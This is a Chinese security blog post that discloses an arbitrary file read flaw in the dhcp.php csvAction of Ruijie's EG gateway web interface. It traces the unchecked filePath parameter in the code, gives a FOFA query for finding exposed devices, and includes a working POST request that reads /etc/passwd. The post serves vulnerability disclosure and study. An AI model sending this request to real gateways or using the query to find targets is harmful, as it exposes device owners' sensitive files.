---
title: "锐捷-EWEB dhcp.php 文件读取漏洞"
source: https://mrxn.net/jswz/ruijieweb-dhcp-fileread.html
asset_dir: assets/锐捷-eweb-dhcp.php-文件读取漏洞
---

# 锐捷-EWEB dhcp.php 文件读取漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/5/5 08:42
- 1028浏览
- [0评论](#comment)
- 23分钟阅读

深入探索

server

软件

服务器

---

# 漏洞简介

锐捷EG易网关是一款综合网关，由锐捷网络完全自主研发。它集成了先进的软硬件体系架构，配备了DPI深入分析引擎、行为分析/管理引擎，可以在保证网络出口高效转发的条件下，提供专业的流控功能、出色的URL过滤以及本地化的日志存储/审计服务。锐捷EG易网关 `dhcp.php` 的 `csvAction` 存在任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞，攻击者可以利用该[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)读取设备上任意文件内容，造成敏感信息泄露。

漏洞扫描服务

# 影响版本

<=2022.07.28.01

# fofa语法

> `title="锐捷网络-EWEB网管系统" || app="Ruijie-EG易网关" && body="/login.php?a=version"`

# 漏洞分析

直接看 `ddi/server/dhcp.php` 中的 `csvAction` 方法实现

深入探索

安全工具开发

SQL注入防护

恶意软件分析工具

```
public function csvAction() {
        $filePath = p('filePath');
        uses("PHPExcel.php");
        $objReader = new PHPExcel_Reader_CSV();
        $objReader->setDelimiter(',');
        $objReader->setInputEncoding('GBK');
        $objReader->setEnclosure('"');
        $objReader->setLineEnding("\r\n");
        $objReader->setSheetIndex(0);
        $objPHPExcel = $objReader->load($filePath);
```

跟进 `PHPExcel_Reader_CSV` 的 `load` 方法

```
public function load($pFilename)
    {
        // Create new PHPExcel
        $objPHPExcel = new PHPExcel();

        // Load into this instance
        return $this->loadIntoExisting($pFilename, $objPHPExcel);
    }
```

跟进 `loadIntoExisting` 方法

```
public function loadIntoExisting($pFilename, PHPExcel $objPHPExcel)
    {
        $lineEnding = ini_get('auto_detect_line_endings');
        ini_set('auto_detect_line_endings', true);

        // Open file
        $this->_openFile($pFilename);
        if (!$this->_isValidFormat()) {
            fclose ($this->_fileHandle);
```

继续跟进 `_openFile` 方法

```
protected function _openFile($pFilename)
    {
        // Check if file exists
        if (!file_exists($pFilename) || !is_readable($pFilename)) {
            throw new PHPExcel_Reader_Exception("Could not open " . $pFilename . " for reading! File does not exist.");
        }

        // Open file
        $this->_fileHandle = fopen($pFilename, 'r');
        if ($this->_fileHandle === FALSE) {
            throw new PHPExcel_Reader_Exception("Could not open file " . $pFilename . " for reading.");
        }
    }
```

可以看到，最终是直接将无任何过滤和校验 post 获取的 `filePath` 直接带入 `fopen` 函数中进行文件操作，导致任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞。

# 漏洞复现

```
POST /ddi/server/dhcp.php?a=csv HTTP/1.1
Host: ruijieweb.mrxn.net
Content-Type: application/x-www-form-urlencoded
Cookie: RUIJIEID=xxxxxxxxxxl855hve3xxxxxxxx
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip

filePath=/etc/passwd
```

成功读取到 `/etc/passwd` 文件内容

漏洞扫描服务

[![锐捷-EWEB dhcp.php 文件读取漏洞](images/img-001-6ff49ef1e544.webp)](https://image.mrxn.net/16c1ef721efa41f8b7c34e813f555fd3.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
